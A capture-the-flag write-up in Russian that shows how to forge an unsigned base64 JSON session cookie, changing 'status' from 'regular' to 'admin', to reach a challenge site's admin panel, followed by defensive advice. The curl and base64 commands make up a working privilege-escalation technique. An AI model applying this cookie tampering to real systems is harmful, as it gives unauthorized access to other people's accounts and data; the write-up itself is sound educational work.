# Cookies with milk 🍪

## Описание задачи 📌

В этой задаче был доступен веб-сервис:

```bash
http://tasks.duckerz.ru:30051
```

При открытии главной страницы отображалась форма входа в "Секретный портал Магистров Кулинарии". Форма просила ввести только имя пользователя, без пароля:

```html
<form method="POST" action="/login">
    <input type="text" id="username" name="username" required>
    <button type="submit">Войти в портал</button>
</form>
```

Уже по названию задачи и интерфейсу было понятно, что основной вектор атаки связан с cookie. Страница называлась "Магистр Куки", а после входа пользователь попадал на `/dashboard`.

## Первичная разведка 🔎

Сначала посмотрели главную страницу:

```bash
curl http://tasks.duckerz.ru:30051
```

В ответ пришел HTML с формой входа. Так как пароль не требовался, следующим шагом было проверить, что сервер делает после отправки имени пользователя.

Отправили POST-запрос на `/login`:

```bash
curl -i -X POST http://tasks.duckerz.ru:30051/login -d 'username=test'
```

Ответ сервера:

```http
HTTP/1.1 302 FOUND
Server: Werkzeug/3.0.1 Python/3.11.14
Location: /dashboard
Set-Cookie: session=eyJ1c2VybmFtZSI6ICJ0ZXN0IiwgInN0YXR1cyI6ICJyZWd1bGFyIn0=; Path=/
```

Самая важная часть ответа:

```http
Set-Cookie: session=eyJ1c2VybmFtZSI6ICJ0ZXN0IiwgInN0YXR1cyI6ICJyZWd1bGFyIn0=
```

Сервер выдал cookie `session`. Ее значение начиналось с `eyJ`, а это частый признак base64-кодированного JSON. JSON обычно начинается с символа `{`, который в base64 часто превращается в `ey`.

## Анализ cookie 🍪

Декодировали значение cookie:

```bash
echo 'eyJ1c2VybmFtZSI6ICJ0ZXN0IiwgInN0YXR1cyI6ICJyZWd1bGFyIn0=' | base64 -d
```

Результат:

```json
{"username": "test", "status": "regular"}
```

Cookie оказалась обычным JSON-объектом, закодированным в base64. Внутри были два поля:

```json
{
  "username": "test",
  "status": "regular"
}
```

Поле `status` выглядело как роль пользователя. Значит, если сервер доверяет данным из cookie, можно попробовать изменить статус с `regular` на `admin`.

## Эксплуатация ⚙️

Создали новый JSON с административным статусом:

```json
{"username": "test", "status": "admin"}
```

Закодировали его в base64:

```bash
echo -n '{"username": "test", "status": "admin"}' | base64
```

Получили:

```text
eyJ1c2VybmFtZSI6ICJ0ZXN0IiwgInN0YXR1cyI6ICJhZG1pbiJ9
```

После этого отправили запрос на `/dashboard`, подставив измененную cookie:

```bash
curl -i http://tasks.duckerz.ru:30051/dashboard \
  -H 'Cookie: session=eyJ1c2VybmFtZSI6ICJ0ZXN0IiwgInN0YXR1cyI6ICJhZG1pbiJ9'
```

Сервер принял измененную cookie и открыл админ-панель:

```html
<h1>Админ-панель</h1>
...
<span class="status-badge">admin</span>
```

Внутри страницы находился флаг:

```text
DUCKERZ{...}
```

## Почему это сработало 🧠

Сервер хранил роль пользователя прямо на клиенте в cookie:

```json
{"username": "test", "status": "regular"}
```

Проблема в том, что cookie была только закодирована в base64, но не была защищена подписью или шифрованием. Base64 не является защитой данных. Это просто способ представления байтов в текстовом виде.

Из-за этого пользователь мог:

1. Получить cookie после логина.
2. Декодировать ее из base64.
3. Изменить поле `status`.
4. Закодировать JSON обратно в base64.
5. Отправить измененную cookie серверу.

Сервер доверился значению `status=admin` и выдал доступ к админ-панели.

## Уязвимость 🚨

Тип уязвимости:

```text
Insecure client-side authorization
```

Также это можно описать как:

```text
Cookie tampering
```

или:

```text
Broken Access Control
```

Главная ошибка приложения: оно принимало решение о правах доступа на основе данных, которые пользователь может свободно менять.

## Как правильно защищаться 🛡️

Нельзя хранить роль пользователя в неподписанной cookie и доверять ей на сервере.

Более безопасные варианты:

1. Хранить роль и права доступа на сервере, например в базе данных или серверной сессии.
2. Использовать подписанные cookies, если состояние все же хранится на клиенте.
3. Проверять права доступа на сервере при каждом обращении к защищенному маршруту.
4. Не считать base64 защитой или шифрованием.

Например, вместо доверия такому объекту:

```json
{"username": "test", "status": "admin"}
```

сервер должен сам проверить в базе данных, действительно ли пользователь `test` является администратором.

## Итог 🏁

Флаг:

```text
DUCKERZ{...}
```

Краткая цепочка решения:

```text
login -> Set-Cookie -> base64 decode -> status regular -> status admin -> base64 encode -> /dashboard -> flag
```

Автор: masquadd :) ✍️
